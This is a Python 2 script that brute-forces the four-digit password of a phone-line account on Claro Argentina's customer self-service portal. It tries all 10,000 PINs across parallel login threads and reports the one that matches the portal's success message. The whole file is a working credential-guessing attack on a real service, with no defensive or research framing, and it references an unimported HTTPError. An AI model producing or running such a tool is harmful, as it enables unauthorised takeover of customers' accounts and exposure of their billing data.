#!/usr/bin/env python
#-*- coding: UTF-8 -*-

import urllib2
import time
import urllib
import cookielib
from debug import debug
import sys
from decoradores import Async

MAINURL = ("""http://www.servicios.claroargentina.com/"""
            """AutogestionCore2006/servlet/Controller""")

LOGINKEY = """LOGINMAS"""
SALDOKEY = """DATOS_FACTURA"""

@Async
def login(loginNumber, password):

    cookies = cookielib.CookieJar()
    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cookies))

    data = urllib.urlencode({
        "EVENT": LOGINKEY,
        "loginNumber": loginNumber,
        "password": password,
        })

    retry = 30
    while retry:
        try:
            html = "\n".join(opener.open(MAINURL, data).readlines())
        except (urllib2.URLError, HTTPError):
            retry -= 1
            time.sleep(1)
            debug("Retry %d" % retry)
        else:
            if """Los datos ingresados son correctos""" in html:
                return password
            else:
                return False


def main():
    loginNumber = sys.argv[1]

    threads = 20
    pause = .1
    slots = [None] * threads
    for password in ("%04d" % n for n in xrange(10000)):
        debug("Probando %s" % password)
        passed = False
        tries = 0
        while not passed:
            tries += 1
            for pos in xrange(threads):
                if slots[pos] is None:
                    passed = True
                elif not slots[pos].is_alive():
                    if slots[pos].result:
                        print "¡La contraseña es %s!" % slots[pos].result
                        return True
                    passed = True
                if passed:
                    slots[pos] = login(loginNumber, password)
                    break
            time.sleep(pause)
        pause *= tries ** 0.2 * .9
        if tries > 10:
            pause = pause * 10 + 0.001

    for slot in slots:
        if slot is not None:
            slot.get_result()

if __name__ == "__main__":
    exit(main())
